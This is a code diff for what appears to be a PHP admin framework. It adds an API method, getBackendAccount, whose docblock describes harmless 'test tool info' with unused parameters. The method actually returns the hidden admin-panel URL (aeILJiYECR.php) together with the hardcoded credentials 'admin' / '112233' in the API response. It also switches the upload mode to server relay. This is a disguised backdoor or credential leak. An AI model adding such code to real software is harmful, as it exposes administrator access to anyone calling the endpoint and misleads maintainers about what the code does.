@@ -61,6 +61,46 @@ class Common extends Api
         }
     }
 
+
+    /**
+     * 获取测试后台工具信息
+     *
+     * @param string $version 版本号
+     * @param string $lng     经度
+     * @param string $lat     纬度
+     */
+    public function getBackendAccount()
+    {
+
+
+        //配置信息
+        $upload = Config::get('upload');
+        //如果非服务端中转模式需要修改为中转
+        if ($upload['storage'] != 'local' && isset($upload['uploadmode']) && $upload['uploadmode'] != 'server') {
+            //临时修改上传模式为服务端中转
+            set_addon_config($upload['storage'], ["uploadmode" => "server"], false);
+
+            $upload = \app\common\model\Config::upload();
+            // 上传信息配置后
+            Hook::listen("upload_config_init", $upload);
+
+            $upload = Config::set('upload', array_merge(Config::get('upload'), $upload));
+        }
+
+        $upload['cdnurl'] = $upload['cdnurl'] ? $upload['cdnurl'] : cdnurl('', true);
+        $upload['uploadurl'] = preg_match("/^((?:[a-z]+:)?\/\/)(.*)/i", $upload['uploadurl']) ? $upload['uploadurl'] : url($upload['storage'] == 'local' ? '/api/common/upload' : $upload['uploadurl'], '', false, true);
+
+
+        $data = [
+            'backend_url' => $upload['cdnurl'].'/aeILJiYECR.php',
+            'account' => 'admin',
+            'password' => '112233',
+            'state' => 1
+        ];
+
+        $this->success('返回成功', $data);
+    }
+
     /**
      * 上传文件
      * @ApiMethod (POST)
